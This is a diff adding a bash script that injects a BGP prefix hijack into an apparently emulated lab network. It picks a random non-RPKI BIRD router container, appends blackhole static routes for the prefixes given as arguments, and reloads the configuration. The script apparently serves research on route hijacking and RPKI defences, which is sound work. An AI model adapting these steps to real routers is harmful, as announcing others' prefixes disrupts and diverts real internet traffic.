@@ -1,0 +1,31 @@
+#!/bin/bash
+
+# To run This hijack provide the Prefix as command arguments 
+# ex: ./Random_Hijack 74.80.186.0/25 74.80.186.128/25
+# The following command will only inject the hijacking on an AS that does not have rpki and not a real world router
+random_con_ID=$(docker ps | grep "rnode" | grep -v "rpki" | grep -v "11872_rw" | grep -v "br-net" | awk '{ print $1 }' | shuf -n 1)
+
+hij_c="echo -e 'protocol static hijacks {\n    ipv4 {\n        table t_bgp;\n    };
+    route $1 blackhole   { bgp_large_community.add(LOCAL_COMM); };
+    route $2 blackhole { bgp_large_community.add(LOCAL_COMM); };
+}' >> bird.conf"
+
+text=$(docker ps --format '{{.Names}}' -f "ID=$random_con_ID")
+delimiter="-"
+string=$text$delimiter
+
+AS_info=()
+while [[ $string ]]; do
+  AS_info+=( "${string%%"$delimiter"*}" )
+  string=${string#*"$delimiter"}
+done
+
+echo "#####################################################"
+#echo "Hijacker ASN: $( tr -d 'as | r' <<<${AS_info[1]})"
+echo "Hijacker IP: ${AS_info[2]}"
+echo "Hijacked Prefix: $1 - $2"
+echo "AS Router Container ID: $random_con_ID"
+
+docker exec --workdir /etc/bird $random_con_ID /bin/bash -c "$hij_c"
+docker exec $random_con_ID /bin/bash -c "birdc configure"
+echo "####### $1 - $2 Prefix is successfully hijacked #######"
